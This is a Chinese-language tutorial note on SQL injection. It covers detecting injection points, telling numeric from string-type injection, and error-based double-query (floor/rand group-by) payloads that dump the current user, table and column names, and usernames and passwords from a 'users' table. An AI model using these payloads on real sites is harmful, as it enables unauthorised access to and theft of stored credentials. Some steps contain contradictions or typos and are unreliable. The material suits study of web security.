SQL注入

就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。通过构造恶意的输入，使数据库执行恶意命令，造成数据泄露或者修改内容等，以达到攻击的目的。主要是由于应用程序对用户的输入没有进行严格的过滤而造成的。

判断是否存在注入漏洞

最为经典的单引号判断法：
在参数后面加上单引号,比如: http://xxx/abc.php?id=1' 如果页面返回错误，则存在 Sql 注入。
原因是无论字符型还是数字型都会因为单引号个数不匹配而报错。

数字型：

假如在1后面加上单引号’ , $id的值就是1’

这时数据库执行的语句就是 select * from table where id=1’

单引号不匹配，语句正确，页面返回错误

（如果未报错，不代表不存在 Sql 注入，因为有可能页面对单引号做了过滤，这时可以使用判断语句进行注入）

字符型：

输入$id=1’

执行的SQL语句就是select * from table where id=‘1’’

单引号不匹配，语句错误，页面错误

即存在注入点

判断注入类型（也就是数据存储类型）

数字型判定

and

假设数据库的执行语句是：select*from table where id=$d;

当查询id=1的页面返回正常页面，此时执行的语句是：select *from table where id=1;

如果在1后面加上 and 1=1，$d的值就变成了1and1=1

数据库查询执行语句是select *from table where id=1and 1=1;

语句正确，真and真=真，逻辑正确，所以返回正常页面

同理

如果加的是and 1=2,

数据库查询执行语句是select *from table where id=1 and 1=2;

语句正确，逻辑错误，页面返回错误

or

or1=1和or1=2 都会返回正常

所以用and1=2来判断，返回错误为数字型，返回正确为字符型

字符型判定

假设数据库的执行语句是：select *from table where id=’$d’

当查询id=1的页面返回正常页面，此时执行的语句是：select *from table where id=’1’

假如在1后面加上 and 1=2 $id的值就是1 and 1=2

这时数据库执行的语句就是 select * from table where id=‘1 and 1=2’

页面返回正常

假如在1后面加上 or 1=1 $id的值就是1 or 1=1

这时数据库执行的语句就是 select * from table where id=‘1 or 1=1’

页面返回正常

所以如果字段是字符型的，那么我们用and或者or来测试时页面都会返回正常，就可以判断了

综上所述：

数字型注入判定：

  1. 输入单引号，不正常返回

  2. 输入and 1=1，正常返回

  3. 输入and1=2，不正常返回

字符型注入判定：

  1. 输入单引号，不正常返回
  2. 输入’ and ‘1’=‘1,正常返回
  3. 输入’and’1’=‘2，不正常返回

?id=1and 1=1和?di=1and 1=2返回是相同的

?id=1’and’1’=’2没有返回值

所以为字符型注入

    双查询注入

    原理：研究人员发现：当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。

    使用函数：

    rand（）：一个生成随机数的函数，它会返回0到1之间的一个值

    floor（）：取证函数 向下取整

    count（）：一个聚合函数，用户返回符合条件的记录数量

    所以

    floor（rand（）*2）的值不是0 就是1

    主公式

    select count(*),concat_ws(‘:’([子查询]),floor(rand()*2)) as a from [table_name] group by a;

    1. 查询当前用户

      ?id=1' union select 1,count(*),concat_ws(':',(select user()),floor(rand()*2)) as a from information_schema.tables group by a --+

      • 理论上未必一次出结果 可能要好几次
      • 但如果把rand（）*2改成rand（0）*2

      查询表名

      ?id=1' union select 1,count(*),concat_ws(':',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2)) as a from information_schema.tables group by a --+

      查询表中列名

      ?id=1' union select 1,count(*),concat_ws(':',(select group_concat(column_name) from information_schema.columns where table_name='users'),floor(rand(0)*2)) as a from users group by a--+

      4.获取表中数据

      ?id=1’ union select 1,count(*),concat_ws(‘:’,(select group_concat(concat_ws(‘,’,username,password) SEPARATOR ‘|’) from users),floor(rand()*2)) as a from users group by a –+

      ?id=1’ union select 1,count(*),concat_ws(’:’,(select group_concat(column_name) from information_schema.columns where table_name=‘users’),floor(rand()*2)) as a from users group by a–+

      都没出 这可为之奈何 ？？？？？

      此方法的根本原因

      通过floor报错的方法来爆数据的本质是group by 语句的报错。

      group by 语句报错的原因是：floor(rand(0)*2)的不确定性，即可能为0也可能为1

      group by key 的原理是循环读取数据的每一行，将结果存储在临时生成的表中，

      如果key 不存在临时表中，则在临时表中插入key所在行的数据；

      如果key在临时表中，则不更新临时表中的数据

      group by floor(rand(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(rand(0)*2)可能为0，如果此时临时表中只有key为1的行而不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插入时又要计算一下随机值，此时floor(rand(0)*2)的结果可能为1，就会导致插入时冲突而报错，即检测时和插入时两次计算了随机数的值

      大佬的：双查询注入 - BloodZero - 博客园 (cnblogs.com)
